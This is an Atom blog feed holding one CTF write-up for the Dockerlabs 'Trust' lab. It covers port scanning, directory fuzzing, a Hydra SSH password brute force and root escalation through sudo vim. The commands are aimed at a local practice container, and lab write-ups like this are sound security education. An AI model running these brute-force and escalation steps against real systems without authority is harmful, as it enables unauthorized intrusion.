<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-22T12:47:21-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">briancgx.io</title><subtitle>Posts about security, CTFs and networking</subtitle><author><name>briancgx</name><email>brian.azael02@gmail.com</email></author><entry><title type="html">Trust - Dockerlabs</title><link href="http://localhost:4000/dockerlabs-writeup-trust/" rel="alternate" type="text/html" title="Trust - Dockerlabs" /><published>2024-06-22T00:00:00-06:00</published><updated>2024-06-22T00:00:00-06:00</updated><id>http://localhost:4000/dockerlabs-writeup-trust</id><content type="html" xml:base="http://localhost:4000/dockerlabs-writeup-trust/"><![CDATA[<p><img src="/assets/images/dockerlabs-trust/trust_logo.png" alt="" />
First, we start by setting up the lab using the root account (It’s important to ensure the file has execution permissions).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ./auto_deploy.sh trust.tar 
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-1.png" alt="" /></p>

<p>Test connectivity.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 172.18.0.2
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-2.png" alt="" /></p>
<h2 id="portscan">Portscan</h2>
<p>Perform an initial scan to see which ports are open</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- -sS --min-rate 5000 -vvv -Pn 172.18.0.2 
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-3.png" alt="" /></p>

<p>Conduct a more specific scan to detect the versions of the previously found open ports.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p22,80 -sCV 172.18.0.2
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-4.png" alt="" /></p>

<h2 id="apache">Apache</h2>
<p>We notice there is an active web service and start exploring it.</p>

<p><img src="/assets/images/dockerlabs-trust/trust-5.png" alt="" /></p>

<p>Since we don’t get much information from there, we use gobuster to discover hidden directories, specifically looking for php and html files in this case.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-6.png" alt="" /></p>

<p>Gobuster reports a directory called secret.php, which we check and it reveals a potential user named mario.</p>

<p><img src="/assets/images/dockerlabs-trust/trust-7.png" alt="" /></p>
<h2 id="bruteforce">Bruteforce</h2>
<p>Since port 22 is also open, we use Hydra to brute force the SSH login for the user mario.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> mario <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
</code></pre></div></div>

<p>The results show that mario’s password is chocolate.</p>

<p><img src="/assets/images/dockerlabs-trust/trust-8.png" alt="" /></p>

<p>We attempt to connect via SSH, and it works successfully.</p>

<p><img src="/assets/images/dockerlabs-trust/trust-9.png" alt="" /></p>
<h2 id="privesc">Privesc</h2>

<p>To escalate privileges, we run the following command to see if there are any binaries that can be executed with sudo permissions.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<p>We observe that we can execute vim with sudo permissions.</p>

<p><img src="/assets/images/dockerlabs-trust/trust-10.png" alt="" /></p>

<p>We open vim with sudo and create a shell, which will be created as root.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo vim
:!/bin/bash
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-11.png" alt="" /></p>

<p><img src="/assets/images/dockerlabs-trust/trust-12.png" alt="" /></p>

<p>After executing this last command, we are automatically authenticated as root, which we can verify by running the <code class="language-plaintext highlighter-rouge">whoami</code> command.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
</code></pre></div></div>

<p><img src="/assets/images/dockerlabs-trust/trust-13.png" alt="" /></p>
<h2 id="pwned">pwned!</h2>]]></content><author><name>briancgx</name><email>brian.azael02@gmail.com</email></author><category term="dockerlabs" /><category term="very easy" /><category term="linux" /><category term="bruteforce" /><category term="privileged vim" /><summary type="html"><![CDATA[This very easy machine required performing fuzzing to find hidden directories and obtain a user. Then, we used Hydra to brute force and get the SSH credentials. Finally, to escalate to root, we used the vim binary which had sudo permissions.]]></summary></entry></feed>